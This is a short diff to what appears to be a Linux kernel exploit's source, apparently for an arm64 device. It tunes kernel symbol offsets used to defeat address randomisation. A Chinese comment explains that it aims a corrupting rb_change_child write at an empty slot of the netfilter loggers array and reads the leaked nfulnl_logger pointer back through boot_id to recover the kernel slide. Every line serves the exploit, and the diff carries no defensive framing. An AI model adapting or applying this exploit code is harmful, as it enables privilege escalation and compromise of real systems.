@@ -60,8 +60,12 @@
 #define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
 #define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
 
+/* loggers 数组 @ 0xffffffc009fe2910 (kallsyms)。
+ * 取 &loggers[1] (0x...2918)：rb_change_child 的写入落进 loggers[2] 空槽，
+ * 不碰 loggers[0]/[1] 活着的 logger 指针；boot_id 读 loggers[1] 的内容
+ * (= &nfulnl_logger + slide) 正是要泄漏的值。 */
 #define SLIDE_NFULNL_LOGGER_OFF 0x01fe29c8ULL
-#define SLIDE_LOGGERS_0_1_OFF 0x01fe2920ULL
+#define SLIDE_LOGGERS_0_1_OFF 0x01fe2918ULL
 #define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02107448ULL
 #define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
 #define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
